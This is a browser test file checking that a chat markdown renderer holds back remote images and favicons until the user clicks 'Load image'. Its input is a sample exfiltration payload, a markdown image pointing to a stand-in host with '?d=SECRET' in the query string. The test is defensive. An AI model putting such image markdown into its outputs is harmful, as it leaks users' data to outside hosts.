import "~/index.css";

import { afterEach, describe, expect, it } from "vite-plus/test";
import { page } from "vite-plus/test/browser/context";

import { AppAtomRegistryProvider } from "../rpc/atomRegistry";
import { renderBrowserHarness } from "../test/browser/render";
import ChatMarkdown from "./ChatMarkdown";

let mounted: Awaited<ReturnType<typeof renderBrowserHarness>> | undefined;

afterEach(async () => {
  await mounted?.unmount();
  mounted = undefined;
  document.body.replaceChildren();
});

function loadedImageSources(): Array<string> {
  return Array.from(document.querySelectorAll("img"))
    .map((element) => element.getAttribute("src") ?? "")
    .filter((src) => src.length > 0);
}

function requestedResourceNames(): Array<string> {
  return performance.getEntriesByType("resource").map((entry) => entry.name);
}

describe("ChatMarkdown browser image loading", () => {
  it("does not request remote images or Google favicons until the user clicks Load image", async () => {
    mounted = await renderBrowserHarness(
      <AppAtomRegistryProvider>
        <ChatMarkdown
          text={
            "![leak](https://leak.invalid/pixel.png?d=SECRET)\n\n[doc](https://secret-internal.corp.example/path)"
          }
          cwd={undefined}
        />
      </AppAtomRegistryProvider>,
    );

    expect(
      loadedImageSources().filter(
        (src) =>
          src.includes("leak.invalid") || src.includes("google.com") || src.includes("gstatic.com"),
      ),
    ).toEqual([]);
    await expect.element(page.getByRole("button", { name: "Load image" })).toBeVisible();

    await new Promise((resolve) => setTimeout(resolve, 300));
    const requested = requestedResourceNames().filter(
      (name) =>
        name.includes("leak.invalid") ||
        name.includes("google.com") ||
        name.includes("gstatic.com"),
    );
    expect(requested).toEqual([]);

    await page.getByRole("button", { name: "Load image" }).click();
    await expect
      .poll(() => loadedImageSources().filter((src) => src.includes("leak.invalid")))
      .toHaveLength(1);
  });
});
